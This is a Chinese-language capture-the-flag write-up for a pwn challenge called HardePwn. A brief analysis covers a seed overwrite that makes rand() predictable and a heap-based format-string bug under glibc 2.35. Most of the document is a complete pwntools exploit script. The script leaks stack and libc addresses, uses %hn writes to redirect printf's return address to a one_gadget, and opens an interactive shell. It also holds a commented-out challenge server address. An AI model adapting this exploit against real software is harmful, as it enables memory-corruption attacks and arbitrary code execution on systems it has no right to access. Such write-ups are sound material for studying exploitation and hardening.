# HardePwn

---

## 目录

[TOC]

---

## 代码审只因-FMT

程序开头要求用户连续输入21个数字，满足`input == (rand() ^ 0x24)+1`，在输入数字前用户可输入`32`个字节的内容，其中`buf [28]`，可溢出4个字节覆盖`seed`，所以`rand()`结果可控

```python
cLib.srand(0)
for i in range(21):
    calc = (cLib.rand() ^ 0x24)+1
    p.sendlineafter("input: ",str(calc))
```

随后用户进入如下流程

```c
void  my_write(char *str)
	write(1, str, strlen(str));
}
void __noreturn heap_fmt(){
    char *ptr = 0;
    while(true){
        ptr = realloc(ptr, 0x1000uLL);
        my_write("input your data ;)\n");
        read(0, ptr, 0x1000uLL);
        printf(ptr);
    }
}
```

明显的**格式化字符串漏洞**

### 分析总结

- 问题1:
  - 程序在死循环中，且没有合法退出途径
- 问题2：
  - 用户输入内容不在栈上而在堆中
- 问题3：
  - 题目使用Glibc2.35，各种hook已被弃用

### 利用分析

针对如上问题，给出如下解决方案

- 篡改循环所调函数的返回值来跳出循环
- 通过修改栈帧指向来修改栈中的值

### 利用方法

- 篡改printf返回地址使其指向`oneGadget`
- 篡改`_IO_2_1_stdout_`结构并篡改`_IO_file_jumps->__write`为`system`



---

## Exploit

```python
from MUC.ezpwn import *


#p,pb,libc = init(log="debug",dbg=1,r="47.108.165.60:47698")


p,pb,libc = init(log="debug",dbg=0)
p.sendafter("Welcome to a ctype game!",b"\x00"*32)

cLib.srand(0)
for i in range(21):
    calc = (cLib.rand() ^ 0x24)+1
    p.sendlineafter("input: ",str(calc))

def s(data):
    p.sendafter("input your data ;)\n",sdata(data)+b"\x00")


current = 0
#根据调试得知 ind-15指向r12所在，ind-45为r12所在
def setR12(ptr):#用来设置R12所指栈帧中的低2字节，既在栈中的偏移
    global current
    current = ptr
    s(f"%{ptr&0xFFFF}c%15$hn")
def writeTo(ptr,value,bits=3):
    for i in range(bits):
        val = (value >> (16*i)) & 0xFFfF
        setR12(ptr+(i*2))#设置栈帧光标
        s(f"%{val}c%45$hn")#写入

#泄露R12地址
s("%15$p")
p.recvuntil("0x")
r12 = int(p.recv(12),16)
retPtr = r12-0x140#计算printf返回地址到r12栈帧的偏移
vLog("R12",r12)

#准备4个栈帧来存放返回地址的不同偏移
bufA = r12-0x110
bufB = bufA+8
bufC = bufB+8
bufD = bufC+8

#泄露Libc地址
s("%31$p")
p.recvuntil("0x")
calcLibcBase("__libc_start_main",int(p.recv(12),16)-128)

#向栈中写入目标指针以便格式化字符串时使用
writeTo(bufA,retPtr)
writeTo(bufB,retPtr+2)
writeTo(bufC,retPtr+4)
writeTo(bufD,retPtr+5)

oneGadget = [0xebcf1,0xebcf5,0xebcf8]

og = getAddr(oneGadget[1])
vLog("oneGadget",og)

#因为要一次性写完，所以得拆字节写，总共6个字节拆成1-1-2-2
ogL = og & 0xFFFF
ogH= (og >> 16) & 0xFFFF
ogA = (og >> 32) & 0xFF
ogB = (og >> 40) & 0xFF
if(ogB < ogA):#要从小写到大，不然就寄了
    dLog("GG")
    p.close()
    exit()
if(ogL > ogH):
    dLog("GG")
    p.close()
    exit()

payload = f"%{ogA}c%13$hhn%{ogB-ogA}c%14$hhn%{ogL-ogB}c%11$hn%{ogH-ogL}c%12$hn"
s(payload)

p.interactive()
```

